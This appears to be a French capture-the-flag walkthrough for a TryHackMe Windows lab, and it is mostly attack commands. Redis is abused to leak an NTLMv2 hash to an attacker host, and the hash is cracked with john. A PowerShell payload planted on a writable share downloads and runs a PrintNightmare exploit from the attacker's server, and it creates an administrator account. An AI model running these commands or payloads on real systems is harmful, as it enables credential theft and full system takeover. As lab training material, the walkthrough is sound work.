# VulnNet: Active - Walkthrough Complet

**Machine** : Windows Server 2019  
**Difficulté** : Medium  
**Objectif** : User flag + System flag

---

## 1. Informations Clés

| Information                  | Valeur                              |
|-----------------------------|-------------------------------------|
| Utilisateur Redis            | `enterprise-security`               |
| Mot de passe trouvé          | `sand_0873959498`                   |
| Share writable               | `Enterprise-Share`                  |
| Technique d'escalade         | PrintNightmare (CVE-2021-1675)      |
| Utilisateur créé             | `adminpwned` / `Pwned123!`          |
| User Flag                    | `THM{********************************}` |
| System Flag                  | `THM{********************************}` |

---

## Étapes Principales de l'Attaque

| Phase                    | Objectif                              | Technique Principale               | Outil Principal          |
|--------------------------|---------------------------------------|------------------------------------|--------------------------|
| Reconnaissance           | Découverte des services               | Scan ports + Enumération           | nmap, rustscan           |
| Initial Access           | Récupération de credentials           | Redis non authentifié + NTLM leak  | redis-cli + Responder    |
| Accès au système         | Exécution de code                     | Scheduled Task + Share writable    | smbclient                |
| Privilege Escalation     | Passage en Administrator              | PrintNightmare                     | Invoke-Nightmare         |
| Post-Exploitation        | Récupération du flag                  | Accès C$                           | smbclient                |

---


## Phase 1 : Reconnaissance
```bash
nmap -p- -A 10.130.138.143
rustscan -a 10.130.138.143 --ulimit 5000
naabu -host 10.129.166.113

#### Ports ouverts importants :

* 6379 → Redis 2.8.2402 (non authentifié)
* 445 → SMB
* 135, 139 → RPC


## Phase 2. Exploitation Redis → Récupération du hash NTLMv2

Lancer Responder :

```bash
sudo responder -I tun0 -dwv

Forcer la connexion UNC depuis Redis :

```bash
redis-cli -h 10.130.138.143
EVAL "dofile('//192.168.143.173/test')" 0


→ Récupération du hash NTLMv2 de VULNNET\enterprise-security
```bash
john enterprise.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=NetNTLMv2
Mot de passe trouvé : sand_0873959498


## Phase 3. Accès au share writable

```bash
crackmapexec smb 10.130.138.143 -u enterprise-security -p 'sand_0873959498' --shares

#### Share découvert : Enterprise-Share (writable)


## Phase 4. Escalade de privilèges avec PrintNightmare

Sur Kali : 
```bash
cd /tmp
wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1 -O PrintNightmare.ps1

cat > PurgeIrrelevantData_1826.ps1 << 'EOF'
IEX (New-Object Net.WebClient).DownloadString('http://192.168.143.173:8080/PrintNightmare.ps1')
Invoke-Nightmare -NewUser "adminpwned" -NewPassword "Pwned123!"
net user adminpwned Pwned123! /add
net localgroup administrators adminpwned /add
EOF

python3 -m http.server 8080
```

Upload du payload :
```bash
smbclient //10.130.138.143/Enterprise-Share -U 'VULNNET\enterprise-security%sand_0873959498' -c "put PurgeIrrelevantData_1826.ps1 PurgeIrrelevantData_1826.ps1"


Vérification de l’utilisateur créé :
```bash
crackmapexec smb 10.130.138.143 -u adminpwned -p 'Pwned123!' --shares


## Phase 5. Récupération du System Flag

```bash
smbclient //10.130.138.143/C$ -U 'VULNNET\adminpwned%Pwned123!' -c "get Users/Administrator/Desktop/system.txt system.txt && cat system.txt"


System Flag :
```bash
THM{*****************************************}


- Étape,Technique,Outil utilisé
- **Reconnaissance**, Scan ports,nmap / rustscan
- **Exploitation initiale**, Redis non authentifié,redis-cli + Responder
- **Récupération creds**, NTLMv2 leak,Responder + John
- **Accès Share**, SMB writable share,crackmapexec / smbclient
- **Escalade**, PrintNightmare (CVE-2021-1675),Invoke-Nightmare
- **Récupération** flag,Accès C$ en tant qu'admin,smbclient


Notes importantes :

*  Le reverse shell n’était pas nécessaire pour finir la box.
*  Le scheduled task qui exécute PurgeIrrelevantData_1826.ps1 toutes les ~60 secondes est la clé de l’exploitation.
* PrintNightmare a permis d’ajouter un utilisateur directement dans le groupe Administrators.

